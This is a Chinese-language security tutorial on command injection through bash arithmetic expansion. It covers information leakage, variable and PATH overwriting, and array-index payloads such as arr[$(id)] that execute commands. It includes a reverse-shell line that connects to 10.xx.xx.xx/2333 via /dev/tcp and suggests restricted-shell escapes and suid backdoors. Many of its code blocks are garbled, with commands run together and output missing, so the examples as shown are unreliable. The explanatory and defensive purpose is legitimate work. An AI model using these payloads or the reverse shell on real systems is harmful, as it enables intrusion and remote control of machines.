# 由算术扩展引发的命令执行

## 起源

大家在初三的时候就知道了 shell 可以通过 `$变量名` 来实现引用变量![](../Images/175f3228d496d827e0b90fbf7ff72eea.png)。举例 `I=$(whoami); echo "I am $I"`，结果是 `I am Macr0phag3`。

与之对应的还有一个特性，官方名字应该是 `算术扩展`(Arithmetic Expansion)。参考链接：https://www.gnu.org/software/bash/manual/html_node/Arithmetic-Expansion.html。但有一个限制，即表达式中的元素必须是数字、算数函数或者变量，如果不符合会报错。可以用的算术符可以参考这个：https://www.gnu.org/software/bash/manual/html_node/Shell-Arithmetic.html#Shell-Arithmetic。

最后得到的值也是数字。若传入的是字符串，则会得到为 0；如果字符串含有非字母，则会报错：

```
➜ ~ a=1; echo

 $((a))"a"; echo
 $((a))"a"
)"A"; echo

 $((a))":A"; echo
 $((a))":A"
)
```

所以这到底有什么用呢？![](../Images/175f3228d496d827e0b90fbf7ff72eea.png)别着急，来看些例子。

## 信息泄露

```

#!/bin/bash
echo $var

if
 (( var == 0 ))then
echo "zero"
else
echo "not zero"
fi

```

运行：

```
➜ ~ var='PATH'

 ./test.sh
```

报错会带出 `PATH` 里的内容。可见 `(( var == 0 ))` 会展开里面的内容，并且实际上还是递归的。

## 变量覆盖

递归展开，例如这个变量覆盖的例子：

```

#!/bin/bash

echo $var
echo $username

if
 (( var == 0 ))then
echo "zero"
else
echo "not zero"
fi

if [[ $code
 == 200 ]]then
echo "pass"
else
echo "access denied"
fi

```

运行

```


➜ ~ ./test.sh'code=200'

 ./test.sh
```

递归展开了 `var='username=200'`，从而改变了看似无法改变的 `username` 的值。当然，递归展开的时候，得到的值也只会是数字，所以 username 最后会是数字。

既然能够覆盖变量，那么覆盖一个 PATH 也是手到擒来，这会导致命令替换，从而执行任意命令![](../Images/94f34310249be4227d60b395f6b7af79.png)。假设有以下脚本：

```

#!/bin/bash
if
 (( var == 0 ))then
echo "zero"
else
echo "not zero"
fi

# ...

# ...

```

这个脚本执行了 `id`。那么我们可以通过覆盖 PATH，使得这个脚本在执行的时候变成执行我们秘♂制的 `id`：

```

➜ ~ md 0echo 'echo "hacked by Macr0phag3"'

 > ./0/id'PATH=0'

 ./test.sh
```

（0 可以换为任意数字）

可惜的是，这个利用场景有点苛刻![](../Images/d7a1ef934005dfcd365f04c96ba6929e.png)，要满足：

1.  源脚本在算术扩展后执行了一个命令
2.  能在源脚本运行的目录下创建目录 0
3.  能够在 0 下面创建同名的恶意脚本

## 命令执行

覆盖 PATH 实现的命令执行，可以，但是不够舒服![](../Images/dd377b71b8f05031abb44deb130c5d4c.png)。如果在算式中使用数组，并且索引为命令，那么在算术扩展的时候会将该命令替换为命令执行的结果，从而实现命令执行：

```

#!/bin/bash
echo $var

if
 (( var == 0 ))then
echo "zero"
else
echo "not zero"
fi

```

运行：

```
➜ ~ var='arr[$(id)]'

 ./test.shin expression (error token is "(macr0phag3) gid=1088(macr0phag3) groups=1088(macr0phag3)"
)'arr[$(whoami)]'

 bash ~/test.sh
```

由于算术扩展的输入是字母类型，所以只有在命令的结果含有特殊字符的时候才有回显，所以可以拼一个特殊字符使它报错：

```
➜ ~ var='arr[:$(whoami)]'

 ./test.sh":macr0phag3"
)
```

还可以这样：

```
➜ ~ var='arr[0$(whoami>&2)]'

 ./test.sh
```

让命令的输出走 stderr，这样 `0$(whoami>&2)` 实际上就是 `0`，可以避免报错。不懂的话，可以再看一下这个，直观一些：

```
➜ ~ var='arr[0$(whoami>&2)]'

 ./test.sh 2>/dev/null
```

虽然可以避免报错，但是由于命令输出走的是 stderr，不一定会回显到应用上。

不过说实话，都能执行任意命令了，其实无所谓输出，反弹 shell 完事![](../Images/6cdf8bc6bc20c24d3fc1559bddd2dc56.png)

```
var='arr[$(bash -i >& /dev/tcp/10.xx.xx.xx/2333)]'
 ./test.sh
```

## 利用场景

可被用于算术扩展的语句不止 `if (( var == 0 ))`，还可以是 `if [[ $var -lt 0 ]]`、`if [ -v "$var" ]`、`echo "$((var))"`。有这个缺陷的也不止 bash，例如 zsh 也有类似的问题，比如 `echo "$((var))"`，那三个 if 试了一下不太行：

```
➜ ~ var='arr[0$(whoami)]'

 bash ./test.shfor base (error token is "0macr0phag3"
)'arr[0$(whoami)]'

 zsh ./test.sh
```

最后，总的来说，这个利用方式其实比较少见。可能的利用场景，例如：

1.  执行用户可控环境变量的固定脚本。例如 url 中某个参数给用户提供了环境变量修改的权限，例如执行脚本时的语言（`LC_CTYPE` 之类的）。这种情况下有机会造成命令执行。
2.  受限的 shell 环境，或许能够通过这个方法进行逃逸。  
    
3.  结合 suid 进行提权。可以通过这个来留提权的后门，不过现在大部分的 shell 都不会理会 shell 脚本的 suid。  
    

## 解决方案

目前我还没找到通用的解决方案，恐怕只能通过避免使用这些会进行算术扩展的语句，如果非得使用，可以对输入进行消毒处理。
